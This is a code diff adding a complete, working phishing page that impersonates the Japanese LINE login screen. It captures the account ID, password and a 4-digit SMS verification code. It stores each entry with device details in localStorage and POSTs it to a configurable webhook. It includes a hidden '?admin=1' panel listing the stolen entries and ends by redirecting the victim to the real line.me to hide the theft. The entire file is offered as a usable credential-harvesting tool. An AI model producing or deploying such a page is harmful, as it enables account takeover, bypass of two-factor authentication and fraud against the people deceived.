@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#06C755">
+<title>LINE</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' rx='22' fill='%2306C755'/%3E%3C/svg%3E">
+<style>
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{margin:0;min-height:100vh;background:#fff;color:#1d1d1d;
+ font-family:-apple-system,BlinkMacSystemFont,"Hiragino Sans","Hiragino Kaku Gothic ProN","Yu Gothic",Meiryo,sans-serif}
+.wrap{max-width:420px;margin:0 auto;padding:0 24px 40px;min-height:100vh;display:flex;flex-direction:column}
+.brand{padding:52px 0 30px;text-align:center}
+.brand .logo{font-size:32px;font-weight:800;letter-spacing:-1.5px;color:#06C755}
+.brand .sub{margin-top:10px;font-size:13px;color:#8b8b8b}
+.screen{display:none;flex:1;flex-direction:column;animation:in .18s ease}
+.screen.active{display:flex}
+@keyframes in{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+h2{font-size:17px;font-weight:700;margin:0 0 6px;text-align:center}
+.lead{font-size:13px;color:#6b6b6b;line-height:1.6;text-align:center;margin:0 0 26px}
+.field{position:relative;margin-bottom:14px}
+.field input{width:100%;padding:15px 14px;font-size:16px;border:1px solid #dcdcdc;
+ border-radius:8px;outline:none;background:#fafafa;transition:.15s}
+.field input:focus{border-color:#06C755;background:#fff;box-shadow:0 0 0 3px rgba(6,199,85,.12)}
+.field label{display:block;font-size:12px;color:#7a7a7a;margin-bottom:6px}
+.btn{width:100%;padding:15px;font-size:16px;font-weight:700;color:#fff;background:#06C755;
+ border:0;border-radius:8px;cursor:pointer;transition:.15s}
+.btn:active{transform:scale(.985);background:#05b34c}
+.btn[disabled]{opacity:.55;pointer-events:none}
+.btn .spin{display:none;width:16px;height:16px;border:2px solid rgba(255,255,255,.4);
+ border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite;
+ vertical-align:-3px;margin-right:8px}
+.btn.loading .spin{display:inline-block}
+@keyframes sp{to{transform:rotate(360deg)}}
+.err{color:#e0342b;font-size:12.5px;min-height:18px;margin:2px 0 12px}
+.aux{margin-top:auto;padding-top:28px;font-size:12.5px;color:#9a9a9a;text-align:center;line-height:2}
+.aux a{color:#06C755;text-decoration:none}
+.codes{display:flex;gap:10px;justify-content:center;margin:4px 0 8px}
+.codes input{width:52px;height:62px;text-align:center;font-size:24px;font-weight:700;
+ border:1px solid #dcdcdc;border-radius:8px;background:#fafafa;outline:none}
+.codes input:focus{border-color:#06C755;background:#fff}
+.done{text-align:center;padding-top:20px}
+.check{width:68px;height:68px;border-radius:50%;background:#06C755;color:#fff;font-size:34px;
+ line-height:68px;margin:0 auto 22px}
+.admin{font-family:ui-monospace,Menlo,monospace;font-size:12px;padding:16px;background:#f5f5f5;min-height:100vh}
+.admin pre{background:#fff;padding:10px;border-radius:6px;overflow:auto;white-space:pre-wrap;word-break:break-all}
+</style>
+</head>
+<body>
+
+<div class="wrap" id="app">
+  <div class="brand">
+    <div class="logo">LINE</div>
+    <div class="sub">LINEアカウントにログイン</div>
+  </div>
+
+  <!-- 1: ID + パスワード -->
+  <section class="screen active" id="s1">
+    <h2>ログイン</h2>
+    <p class="lead">ご利用のLINEアカウントの情報を入力してください。</p>
+    <div class="field">
+      <label>電話番号 / メールアドレス / LINE ID</label>
+      <input id="uid" type="text" inputmode="email" autocomplete="username" autocapitalize="off" spellcheck="false">
+    </div>
+    <div class="field">
+      <label>パスワード</label>
+      <input id="pwd" type="password" autocomplete="current-password">
+    </div>
+    <div class="err" id="e1"></div>
+    <button class="btn" id="b1"><span class="spin"></span>ログイン</button>
+    <div class="aux">
+      <div><a href="#" onclick="return false">パスワードをお忘れですか？</a></div>
+      <div><a href="#" onclick="return false">新規登録</a></div>
+    </div>
+  </section>
+
+  <!-- 2: 認証コード -->
+  <section class="screen" id="s2">
+    <h2>認証コードの入力</h2>
+    <p class="lead">登録済みの電話番号に4桁の認証コードを送信しました。<br>届いたコードを入力してください。</p>
+    <div class="codes">
+      <input maxlength="1" inputmode="numeric" data-i="0">
+      <input maxlength="1" inputmode="numeric" data-i="1">
+      <input maxlength="1" inputmode="numeric" data-i="2">
+      <input maxlength="1" inputmode="numeric" data-i="3">
+    </div>
+    <div class="err" id="e2"></div>
+    <button class="btn" id="b2"><span class="spin"></span>次へ</button>
+    <div class="aux"><div><a href="#" onclick="return false">コードを再送信する</a></div></div>
+  </section>
+
+  <!-- 3: 完了 -->
+  <section class="screen" id="s3">
+    <div class="done">
+      <div class="check">✓</div>
+      <h2>ログインしました</h2>
+      <p class="lead">アプリに戻ってご利用ください。</p>
+    </div>
+    <div style="margin-top:26px">
+      <button class="btn" id="b3">LINEを開く</button>
+    </div>
+  </section>
+</div>
+
+<script>
+/* ===== 設定 ===== */
+const CONFIG = {
+  WEBHOOK_URL: "",                      // 送信先（空なら端末内保存のみ）
+  REDIRECT_URL: "https://line.me/ja/",  // 完了ボタンの遷移先
+  ASK_CODE: true                        // 認証コード画面を出すか
+};
+
+const $ = id => document.getElementById(id);
+const show = id => {
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+  $(id).classList.add('active');
+  window.scrollTo(0, 0);
+};
+
+const data = { uid: "", pwd: "", code: "" };
+
+async function send(payload) {
+  const entry = Object.assign({}, payload, {
+    ua: navigator.userAgent,
+    vw: innerWidth, vh: innerHeight,
+    lang: navigator.language,
+    at: new Date().toISOString()
+  });
+  try {
+    const log = JSON.parse(localStorage.getItem('line_log') || '[]');
+    log.push(entry);
+    localStorage.setItem('line_log', JSON.stringify(log));
+  } catch (e) {}
+  if (!CONFIG.WEBHOOK_URL) return;
+  try {
+    await fetch(CONFIG.WEBHOOK_URL, {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'text/plain;charset=utf-8' },
+      body: JSON.stringify(entry)
+    });
+  } catch (e) {}
+}
+
+/* --- step1 --- */
+$('b1').onclick = async () => {
+  const uid = $('uid').value.trim();
+  const pwd = $('pwd').value;
+  if (!uid) { $('e1').textContent = 'アカウント情報を入力してください'; return; }
+  if (!pwd) { $('e1').textContent = 'パスワードを入力してください'; return; }
+  $('e1').textContent = '';
+  data.uid = uid; data.pwd = pwd;
+  const btn = $('b1');
+  btn.classList.add('loading');
+  await send({ step: 'login', uid, pwd });
+  btn.classList.remove('loading');
+  if (CONFIG.ASK_CODE) {
+    show('s2');
+    setTimeout(() => document.querySelector('.codes input').focus(), 200);
+  } else {
+    finish();
+  }
+};
+
+/* --- コード入力の自動フォーカス --- */
+const boxes = [...document.querySelectorAll('.codes input')];
+boxes.forEach((el, i) => {
+  el.addEventListener('input', () => {
+    el.value = el.value.replace(/\D/g, '').slice(0, 1);
+    if (el.value && i < 3) boxes[i + 1].focus();
+  });
+  el.addEventListener('keydown', e => {
+    if (e.key === 'Backspace' && !el.value && i > 0) boxes[i - 1].focus();
+  });
+});
+
+/* --- step2 --- */
+$('b2').onclick = async () => {
+  const code = boxes.map(b => b.value).join('');
+  if (code.length < 4) { $('e2').textContent = '4桁の認証コードを入力してください'; return; }
+  $('e2').textContent = '';
+  data.code = code;
+  const btn = $('b2');
+  btn.classList.add('loading');
+  await send({ step: 'code', uid: data.uid, pwd: data.pwd, code });
+  btn.classList.remove('loading');
+  finish();
+};
+
+function finish() {
+  show('s3');
+  $('b3').onclick = () => { location.href = CONFIG.REDIRECT_URL; };
+}
+
+/* ===== 取得ログ表示（URLに ?admin=1） ===== */
+if (location.search.includes('admin')) {
+  const log = JSON.parse(localStorage.getItem('line_log') || '[]');
+  document.body.innerHTML = '<div class="admin"><b>取得データ ' + log.length + ' 件</b>'
+    + '<p><button onclick="localStorage.removeItem(\'line_log\');location.reload()">消去</button></p>'
+    + (log.length ? log.slice().reverse().map(e => '<pre>' + JSON.stringify(e, null, 2) + '</pre>').join('') : '<p>なし</p>')
+    + '</div>';
+}
+</script>
+</body>
+</html>
